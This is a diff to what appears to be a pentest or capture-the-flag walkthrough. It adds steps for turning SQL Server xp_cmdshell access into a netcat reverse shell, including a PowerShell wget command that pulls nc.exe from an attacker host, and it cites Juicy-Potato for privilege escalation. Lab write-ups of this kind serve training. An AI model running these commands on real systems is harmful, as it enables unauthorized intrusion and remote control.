@@ -81,7 +81,18 @@ Now as we got a foothold we can either try to get a more stable shell, or procee
 
 
 
-
 ## Escalating to a reverse shell
 ---
-As of now, we have full access to an account that we know it can Impersonate Tokens
+Escalating to a reverse shell in this scenario is pretty much trivial and can be done in a handful of ways.
+The way i'm going to do it is by uploading an [old windows netcat executable](https://github.com/Ev3nS/Useful-Pentesting-Executables) that has the **-e flag** in order to spawn a powershell.exe and send it to my local listener.
+
+### Uploading  nc.exe
+1. Spawning a http server on desktop (where the executable is located):  
+![httpServer.png]({{site.baseurl}}/images/httpServer.png)
+2. Getting the executable on the machine with the command line:  
+**xp_cmdshell powershell "wget http://YourIP:GivenPort/nc.exe -OutFile %temp%/nc.exe"**  
+![SqlCommand.png]({{site.baseurl}}/Images/SqlCommand.png)
+
+## Escalating to a root shell
+---
+As of now, we have full access to an account that we know it can Impersonate Tokens, which means that we can take ownage of a process run by a higher privileged user on the system and create a privileged shell. This can be done via [Juicy-Potato exploit](https://github.com/ohpe/juicy-potato).
